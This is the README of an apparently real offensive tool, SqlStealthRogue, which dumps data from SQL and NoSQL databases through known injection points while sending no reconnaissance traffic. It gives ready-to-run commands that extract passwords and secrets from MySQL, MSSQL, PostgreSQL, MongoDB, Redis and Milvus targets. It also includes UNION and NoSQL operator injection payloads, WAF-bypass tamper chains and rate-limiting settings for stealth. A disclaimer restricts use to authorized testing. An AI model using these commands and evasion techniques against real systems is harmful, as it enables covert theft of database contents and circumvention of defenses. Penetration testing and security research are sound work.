# SqlStealthRogue

> **让天底下没有难拖的数据库。** · [中文文档](README.zh-CN.md)

[![Python 3.7+](https://img.shields.io/badge/Python-3.7%2B-blue?style=flat-square)](https://www.python.org/)
[![Zero Dependency](https://img.shields.io/badge/Dependency-Zero-green?style=flat-square)]()
[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
[![DBMS](https://img.shields.io/badge/DBMS-12%20Engines%20Verified-critical?style=flat-square)]()
[![Extra Requests](https://img.shields.io/badge/Extra%20Requests-0-critical?style=flat-square)]()

**A minimalist, zero-probe SQL/NoSQL injection data dumper.** Single entry file, pure Python standard library, no dependencies.

SqlStealthRogue is a scalpel, not a swiss-army knife: given a **known injection point and known database/table/columns**, it extracts data at high speed with **zero negotiation and zero reconnaissance traffic**. sqlmap — even with `-D/-T/-C` pinned — still fires requests for DBMS fingerprinting, version detection, privilege/table enumeration, WAF detection and technique polling. SqlStealthRogue does the opposite: **every single request it sends is a data-extraction request.**

> ⚠️ **For authorized security testing only.** Using this tool against systems you do not have written permission to test is illegal. You are solely responsible for your actions.

---

## ✨ Key Features

### 🔇 Zero Extra Requests

| Behavior | SqlStealthRogue |
|---|---|
| DBMS fingerprint / version probing | ❌ does not exist |
| Privilege / schema enumeration | ❌ does not exist (you already know the target) |
| WAF detection / technique polling | ❌ does not exist (`--dbms` + `--technique`, specify and go) |
| True-mark calibration requests | ❌ does not exist (row termination rides on extraction requests) |
| **Every request sent** | ✅ **is an extraction request** (verified by per-request accounting on a mock harness + 12 real engines) |

### ⚡ High-Speed Extraction (measured on real engines)

| Optimization | Measured effect |
|---|---|
| Bit-parallel blind engine (`char & mask`, 8 concurrent bits) | **5.35×** faster, request count identical to serial binary search |
| HTTP keep-alive, thread-local connections | **5.6×** faster (auto-downgrades on HTTP/1.0 targets, zero penalty) |
| Error-mode adaptive chunk prefetch | long values fetched in one batch |
| PG/MSSQL large chunks (error messages carry ≥800 chars, measured) | 600-char value: **22 → 6 requests** |
| UNION mode | whole table in **1 request** |

### 🧩 Custom WAF-Bypass Plugins (tamper chains)

```bash
# 13 sqlmap-compatible tampers built in; compose in order; zero extra traffic
python SqlStealthRogue.py --tamper "randomcase,between,space2comment" ...

# Custom plugin: one .py file with one tamper() function — drop it in a directory
python SqlStealthRogue.py --tamper mybypass --tamper-dir /path/to/tampers ...
```

Built-ins: `space2comment` `space2plus` `space2randomblank` `between` `equaltolike` `randomcase` `charencode` `chardoubleencode` `halfversionedmorekeywords` `apostrophemask` `percentage` `unionalltounion` `xforwardedfor`

### 🛡️ Minimal-Blast-Radius Abort on Misconfiguration

A wrong parameter never floods the target — the cost of a mistake is capped at "first row, first value":

| Misconfiguration | Packets actually sent |
|---|---|
| Statically invalid args / unknown tamper / dbms×technique mismatch | **0** |
| Injection point unreachable | ≤ 2 |
| Template or true-mark syntax error | 8–16 |
| Always-true true-mark / always-matching regex (sentinel guards abort) | ~128 (would be 16,384+ without guards) |
| Bad UNION template | 1 |

### 🗄️ 12-Engine Real-Machine Verification Matrix

| Engine | error | bool | time | prefix | union |
|---|:---:|:---:|:---:|:---:|:---:|
| MySQL 8 | ✅ | ✅ | ✅ | — | ✅ |
| PostgreSQL 14 | ✅ | ✅ | ✅ | — | ✅ |
| MSSQL 2022 | ✅ | ✅ | ✅ | — | ✅ |
| SQLite | ❌¹ | ✅ | ✅ | — | ✅ |
| Redis | — | ✅ | ⚠️² | — | ✅ |
| MongoDB 7 | — | ✅ | ✅ | ✅ | — |
| openGauss 5 | ✅ | ✅ | ✅ | — | ✅ |
| OceanBase CE | ❌¹ | ✅ | ✅ | — | ✅ |
| Oracle 23ai | ❌³ | ✅ | ✅ | — | ✅ |
| Elasticsearch 8 | — | ✅ | ⚠️² | — | ✅ |
| Milvus 2.4 | — | — | — | — | ✅ |
| pgvector | ✅ | ✅ | ✅ | — | ✅ |

¹ Disabled by real-machine evidence (engine error messages carry no data / function unimplemented) ² Template shipped, not lab-verified ³ 23ai XMLType errors no longer echo data; older versions can re-enable via `-A` (template in `dbms/oracle.py` docstring)

---

## 🚀 Quick Start

```bash
git clone https://github.com/lupingQAQ/SqlStealthRogue.git
cd SqlStealthRogue
python SqlStealthRogue.py --list            # engine × technique matrix
python SqlStealthRogue.py --list-tampers    # tamper plugin inventory
```

**Mark the injection point with `*`; specify engine and technique on the command line:**

```bash
# MySQL error-based dump (default engine & technique, auto row wrapping, stops on empty)
python SqlStealthRogue.py -u "http://target/page.php?id=1*" \
  -q "SELECT password FROM users"

# MSSQL error-based
python SqlStealthRogue.py --dbms mssql -u "http://target/p.aspx?id=1*" \
  -q "SELECT name FROM master..sysdatabases"

# PostgreSQL time-based blind (no visible difference)
python SqlStealthRogue.py --dbms postgres --technique time --sec 5 \
  -u "http://target/p.php?id=1*" -q "SELECT secret FROM t"

# MongoDB regex-prefix (PHP-style form operator injection)
python SqlStealthRogue.py --dbms mongodb --technique prefix --true-mark "Login OK" \
  -u "http://target/login" --data "password[$regex]=*" -q password

# MongoDB $where boolean (injection lands inside the $where JS string)
python SqlStealthRogue.py --dbms mongodb --technique bool --true-mark "..." \
  -u "http://target/login" --data '{"user":"admin","$where":"*"}' --raw -q password

# Redis (CRLF inline-command injection + EVAL)
python SqlStealthRogue.py --dbms redis --technique union \
  -u "http://target/api?key=1*" -q secretkey --regex '\$[0-9]+\r\n(.+?)\r\n'

# Milvus expression injection (one-shot full dump)
python SqlStealthRogue.py --dbms milvus --technique union \
  -u "http://target/search?expr=*" -q x --regex '"secret":\s*"([^"]*)"'

# UNION whole-table in 1 request (wrap values with [[ ]] markers in SQL)
python SqlStealthRogue.py --technique union -u "http://target/p.php?id=1*" \
  -U " UNION SELECT NULL,NULL,{Q}#" \
  -q "concat(0x5b5b,col,0x5d5d) FROM t" --regex "\[\[(.*?)\]\]"
```

**Speed / stealth knobs:**

```bash
--bwidth 32    # in-value probe concurrency (HTTP concurrency cap is exactly this)
--threads 8    # parallel rows
--delay 0.5 --bwidth 1 --threads 1   # fully serial + rate-limited: maximum stealth
--err-mark 'ERR:'   # backend error page = invalid probe (abort loudly instead of corrupting data)
```

## 🧠 How It Works

```
SqlStealthRogue/
├── SqlStealthRogue.py          # thin entrypoint
└── SqlStealthRogue/
    ├── core.py                 # engine: keep-alive sender + 5 extraction algorithms + row iteration + guards
    ├── cli.py                  # args / validation / dispatch
    ├── dbms/                   # engine plugins: one file per engine, drop-in registration (base inheritance)
    └── tampers/                # WAF-bypass plugins: one file one tamper(), same-name overrides built-in
```

**Five extraction algorithms** (least traffic first): `union` (whole table, 1 request) → `error` (1 request per 30–500 chars, chunk-prefetched) → `bool` (8 requests per char, bit-parallel) → `time` (8 requests per char, deliberately serial to avoid melting the target) → `prefix` (NoSQL `$regex` charset binary search).

**Placeholder contract**: `*` in URL/body = injection point; in templates `{Q}` query, `{F}` field, `{P}` position, `{N}` chunk size, `{K}/{M}` compare value / bit mask, `{T}` delay seconds, `{S}` prefix, `{HH}` charset upper bound. Every template is overridable via `-A/-B/--bit-tpl/--time-tpl/-U`.

**Adding an engine = one PROFILE file of a few dozen lines in `dbms/`** — zero registration code; compatible engines inherit via `base` (`pgvector` is literally one line: `base: 'postgres'`).

See [ARCHITECTURE.md](ARCHITECTURE.md) for design decisions, [CONTRIBUTING.md](CONTRIBUTING.md) to add plugins, [SECURITY.md](SECURITY.md) for the authorized-use policy.

## ⚠️ Honest Boundaries

- The bit-parallel blind engine treats an all-zero byte as end-of-string: use error/union for binary data (BLOBs)
- Blind extraction is byte-wise: multi-byte characters come back mangled (error/union transmit whole segments)
- Time-based mode stays serial on purpose: parallel SLEEPs stack load on the target
- The cost of zero probing: on a wrong config the tool only says `no rows extracted` — use `--err-mark` to turn backend errors into loud failures

## 📜 Disclaimer

This project is for **authorized** penetration testing, security research and education only. Testing any system without the owner's written consent is a crime. The authors accept no liability for abuse. By using this tool you represent that you have written authorization from the target system's owner.

## License

[MIT](LICENSE) · [Changelog](CHANGELOG.md)
